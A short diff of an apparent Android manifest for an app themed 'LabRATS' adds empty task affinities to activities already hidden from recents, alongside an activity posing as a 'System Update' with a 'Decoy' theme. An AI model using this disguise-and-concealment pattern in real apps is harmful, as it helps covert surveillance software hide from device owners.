@@ -99,9 +99,9 @@
             android:name=".MainActivity"
             android:exported="true"
             android:launchMode="singleInstance"
-            android:noHistory="true"
             android:excludeFromRecents="true"
             android:autoRemoveFromRecents="true"
+            android:taskAffinity=""
             android:theme="@style/Theme.LabRATS">
         </activity>
 
@@ -122,6 +122,7 @@
             android:theme="@style/Theme.LabRATS.Permissions"
             android:excludeFromRecents="true"
             android:autoRemoveFromRecents="true"
+            android:taskAffinity=""
             android:exported="true" />
 
         <activity
@@ -129,6 +130,7 @@
             android:exported="false"
             android:excludeFromRecents="true"
             android:autoRemoveFromRecents="true"
+            android:taskAffinity=""
             android:label="System Update"
             android:icon="@drawable/ic_analytics_data"
             android:theme="@style/Theme.LabRATS.Decoy">
